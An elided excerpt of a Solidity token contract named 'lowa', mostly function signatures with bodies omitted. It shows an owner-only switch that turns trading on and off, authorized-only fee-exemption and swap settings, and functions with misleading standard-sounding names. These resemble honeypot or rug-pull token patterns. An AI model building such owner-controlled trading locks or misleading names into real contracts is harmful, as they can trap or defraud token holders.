...
contract lowa is IERC20, libAuthorization {
    using SafeMath for uint256;    
    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public constant ZERO = 0x0000000000000000000000000000000000000000;
    string constant _name = "lowa";
    string constant _symbol = "LOWA";
    ...
    function getLastCombia(uint256 amount, uint256 _lastProcessedIndex,  uint256 gas) public view returns (uint256, uint256)       
		{
    ...
    function checkdata(uint256 lastClaimTime, uint256 claimWait) private view returns (bool) {
    ...
    function totalSupply(uint256 _rTotal, uint256 _tTotal) private pure returns(uint256, uint256) {
    ...
    function removeLiquidityWithPermit(uint256 _maxHold) public view returns(uint256) {
	...
	function swapExactTokensForTokens(address _token, uint256 tokens) private  {
    ...
    function queueTransaction(uint256 launchAt, uint256 dura) public view returns (bool){
    ...
    function TradeStatus(bool _status) public onlyOwner {
        tradingOpen = _status;
    }    
    
    function SwapSettings(bool _enabled, uint256 _amount) external authorized {
        swapEnabled = _enabled;
        swapThreshold = _amount;
    }  

    function FeeExempt(address holder, bool exempt) external authorized {
